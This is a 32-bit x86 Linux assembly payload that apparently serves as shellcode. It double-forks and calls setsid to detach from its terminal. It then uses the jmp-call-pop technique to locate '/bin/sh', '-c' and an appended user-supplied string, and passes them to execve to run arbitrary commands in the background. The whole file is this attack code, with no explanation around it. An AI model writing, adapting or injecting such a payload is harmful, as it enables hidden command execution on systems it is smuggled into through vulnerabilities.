#include <sys/syscall.h>

#define BINSH "/bin/sh\x00"
#define TACC "-c\x00\x00\x00\x00\x00\x00"

.intel_syntax noprefix
.globl main
.type main, @function

main:
    mov eax, SYS_fork
    int 0x80
    cmp eax, 1
    jl setsid
    xor ebx, ebx
    mov eax, SYS_exit
    int 0x80

setsid:
    mov eax, SYS_setsid
    int 0x80
    mov eax, SYS_fork
    int 0x80
    cmp eax, 1
    jl forkexit
    xor ebx, ebx
    mov eax, SYS_exit
    int 0x80

forkexit:
    jmp pop_binsh

ret1:
    pop ebx
    jmp pop_tacc

ret2:
    pop esi
    jmp pop_userinput

ret3:
    pop edi

binsh:
    xor eax, eax
    push eax
    push edi
    push esi
    push ebx
    mov ecx, esp
    xor edx, edx
    mov eax, SYS_execve
    int 0x80

exit:
    xor ebx, ebx
    mov eax, SYS_exit
    int 0x80

pop_binsh:
    call ret1
    .string BINSH

pop_tacc:
    call ret2
    .string TACC

pop_userinput:
    call ret3
